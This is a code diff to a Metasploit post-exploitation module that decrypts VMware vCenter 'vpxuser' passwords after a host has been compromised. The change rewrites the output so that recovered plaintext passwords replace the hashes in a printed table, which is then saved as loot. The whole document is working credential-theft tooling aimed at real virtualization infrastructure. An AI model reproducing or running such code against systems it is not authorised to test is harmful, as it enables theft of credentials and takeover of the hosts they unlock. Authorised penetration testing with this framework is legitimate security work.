@@ -311,15 +311,16 @@ class MetasploitModule < Msf::Post
 
   def decrypt_vpxuser_passwords(query_result, symkey)
     query_lines = query_result.split("\n")
+    max_pwd_length = 32 # default password length
     # check if actually received any results. We should have at least 4 lines, since the first two lines contain the table headers, and the last one the number of rows
     return 1 unless query_lines.length >= 4
     vpxuser_results = []
     cred_lines = query_result.split("\n")[2..-2]
     print_status("Attempting to crack the #{cred_lines.length} vpxuser passwords we have obtained.")
     cred_lines.each do |cline|
-      cline = cline.strip
-      username, vpxuser_hash, local_ip, remote_ip, dns_name = cline.split(/\s+\|\s+/)
-      vpxuser_hash = vpxuser_hash.delete_suffix('*')
+      username, vpxuser_hash_raw, local_ip, remote_ip, dns_name = cline.split(/\s+\|\s+/)
+      username = username&.strip
+      vpxuser_hash = vpxuser_hash_raw&.delete_suffix('*')
       # we need values for all 4 variables for the creds to be useable
       next if [username, vpxuser_hash, local_ip, remote_ip, dns_name].any? {|i| i.nil? || i.empty? }
 
@@ -340,16 +341,16 @@ class MetasploitModule < Msf::Post
         next
       end
 
+      # default password length is 32
+      if password.length != 32
+        max_pwd_length = password.length if password.length > max_pwd_length
+        vprint_warning("Password length does not equal the default of 32. This could mean something went wrong.")
+      end
+
       print_good("Password decrypted! Remote host:#{remote_ip_dns} - Username:#{username} - Password:#{password}")
-      vpxuser_results << {
-        'username' => username,
-        'hash' => vpxuser_hash,
-        'password' => password,
-        'iv' => iv,
-        'secret' => secret_b64,
-        'local_ip' => local_ip,
-        'remote_ip_dns' => remote_ip_dns
-      }
+      # replace the hash with the password and save the new line so we can save a new table later
+      new_cline = cline.gsub(vpxuser_hash_raw, password)
+      vpxuser_results << new_cline
     end
 
     if vpxuser_results.empty?
@@ -357,7 +358,28 @@ class MetasploitModule < Msf::Post
       return 1
     end
 
-    vpxuser_results
+    # adjust the table header to the max password length
+    table_column_names, table_header_border = query_lines[0..1]
+    new_table_column_names_arr = table_column_names.split('|')
+    new_password_header = ' ' * ((max_pwd_length - 8)/2) + 'password'
+    new_password_header += ' ' * (max_pwd_length + 2 - new_password_header.length)
+    new_table_column_names_arr[1] = new_password_header
+    new_table_column_names = new_table_column_names_arr.join('|')
+
+    new_password_header_border = '-' * (max_pwd_length + 2)
+    new_table_header_border_arr = table_header_border.split('+')
+    new_table_header_border_arr[1] = new_password_header_border
+    new_table_header_border = new_table_header_border_arr.join('+')
+    vpxuser_results.unshift(new_table_header_border)
+    vpxuser_results.unshift(new_table_column_names)
+    
+    print_good("Obtained #{vpxuser_results.length - 2 } plaintext passwords:")
+    puts vpxuser_results.join("\n")
+
+    # save the results
+    filename = 'vpxuser_pwds'
+    path = store_loot(filename, 'text/plain', session, vpxuser_results.join("\n") + "\n", "vcenter_#{filename}.txt")
+    print_status("Saving the results to #{path}")
   end
 
   def run
@@ -403,13 +425,7 @@ class MetasploitModule < Msf::Post
       symkey = get_symkey
       unless symkey == 1
         print_good("Obtained the following symkey: #{symkey}")
-        vpxuser_results = decrypt_vpxuser_passwords(query_result, symkey)
-        unless vpxuser_results == 1
-          # save the results in pretty JSON format
-          filename = 'vpxuser_pwds'
-          path = store_loot(filename, 'application/json', session, JSON.pretty_generate(vpxuser_results), "vcenter_#{filename}.json")
-          print_good("Saving #{vpxuser_results.length} plaintext vpxuser credentials in JSON format to #{path}")
-        end
+        decrypt_vpxuser_passwords(query_result, symkey)
       end
     end
   end
